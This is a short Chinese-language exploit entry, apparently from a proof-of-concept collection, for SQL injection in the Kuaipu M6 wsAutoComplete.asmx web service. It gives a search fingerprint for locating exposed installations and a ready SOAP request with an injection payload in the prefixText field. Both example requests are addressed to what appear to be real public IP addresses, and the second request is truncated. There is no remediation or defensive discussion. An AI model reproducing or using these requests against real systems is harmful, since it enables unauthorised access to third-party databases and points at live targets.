# 快普M6GetAccountTitleList存在多个SQL注入漏洞

- **系统**：快普　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="Resource/JavaScript/jKPM6.DateTime.js"`
- **请求**：`POST /WebService/wsAutoComplete.asmx HTTP/1.1`

**请求体 / payload**
```
POC1如下
Host: 106.41.108.104:8086
Content-Type: application/soap+xml;charset=UTF-8;action="http://tempuri.org/GetAccountTitleList"
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
<soap:Header/>
<soap:Body>
<tem:GetAccountTitleList>
<!--Optional:-->
<tem:prefixText>'-1/user--</tem:prefixText>
<tem:count>1</tem:count>
</tem:GetAccountTitleList>
</soap:Body>
</soap:Envelope>
POC2如下
POST /WebService/wsAutoComplete.asmx HTTP/1.1
Host: 47.94.1.145
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetCustom…（脚本共 1597 字，完整版见原文）
```
- **预期**：200　|　—